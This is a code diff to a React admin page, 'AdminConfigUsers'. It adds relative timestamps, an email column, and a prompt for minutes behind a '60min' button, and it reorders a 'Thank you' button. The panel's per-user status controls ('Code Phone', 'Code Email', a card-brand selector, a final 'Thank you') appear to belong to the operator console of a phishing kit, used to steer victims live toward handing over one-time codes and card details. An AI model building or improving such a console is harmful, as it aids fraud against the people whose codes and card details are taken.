@@ -5,6 +5,10 @@ const { Header, Content, Footer } = Layout;
 
 import axios from "axios";
 import { API_BE } from "./utils/variable";
+const dayjs = require("dayjs");
+const relativeTime = require("dayjs/plugin/relativeTime");
+
+dayjs.extend(relativeTime);
 
 export const AdminConfigUsers = () => {
   const hostname = window.location.hostname;
@@ -104,6 +108,17 @@ export const AdminConfigUsers = () => {
     }
   };
 
+  const onConfirm60Min = (id, status) => {
+    if (!id || !status) return;
+
+    let min = prompt("Please enter minutes:", "");
+    if (min == null || min == "") {
+      console.log("User cancelled the prompt.");
+    } else {
+      updateStatus(id, status, min);
+    }
+  };
+
   const onConfirmThankYou = (id, confirmThankYou, status) => {
     if (!id || !status) return;
 
@@ -153,10 +168,18 @@ export const AdminConfigUsers = () => {
       render: (text) => <a>{text}</a>,
     },
     {
-      title: "Hostname",
-      dataIndex: "web_unique",
-      key: "web_unique",
-      render: (text) => <a>{text}</a>,
+      title: "Email",
+      dataIndex: "email",
+      key: "email",
+    },
+    {
+      title: "Created",
+      dataIndex: "created_at",
+      key: "created_at",
+      render: (text) => {
+        const timeAgo = dayjs(text);
+        return <a>{timeAgo?.from(dayjs()) || ""}</a>;
+      },
     },
     {
       title: "Action",
@@ -199,17 +222,6 @@ export const AdminConfigUsers = () => {
           >
             Code Phone
           </Button>
-
-          <Button
-            type=""
-            style={
-              e?.status === 6 ? { background: "#52c41a", color: "white" } : {}
-            }
-            onClick={(e) => updateStatus(item.unique_id, 6)}
-          >
-            60min
-          </Button>
-
           <Button
             style={
               e?.status === 8 ? { background: "green", color: "white" } : {}
@@ -217,6 +229,25 @@ export const AdminConfigUsers = () => {
             onClick={(e) => onConfirmEmail(item.unique_id, "", 8)}
           >
             Code Email
+          </Button>
+          <Button
+            type=""
+            style={
+              e?.status === 6 ? { background: "#52c41a", color: "white" } : {}
+            }
+            // updateStatus(item.unique_id, 6)
+            onClick={(e) => onConfirm60Min(item.unique_id, 6)}
+          >
+            60min
+          </Button>
+          <Button
+            type=""
+            style={
+              e?.status === 5 ? { background: "#52c41a", color: "white" } : {}
+            }
+            onClick={(e) => updateStatus(item.unique_id, 5)}
+          >
+            Thank you
           </Button>
           <Select
             onChange={(value) => onSelectChange(item.unique_id, 7, value)}
@@ -232,15 +263,6 @@ export const AdminConfigUsers = () => {
             <Option value="amex">Amex</Option>
             <Option value="discover">Discover</Option>
           </Select>
-          <Button
-            type=""
-            style={
-              e?.status === 5 ? { background: "#52c41a", color: "white" } : {}
-            }
-            onClick={(e) => updateStatus(item.unique_id, 5)}
-          >
-            Thank you
-          </Button>
         </Space>
       ),
     },
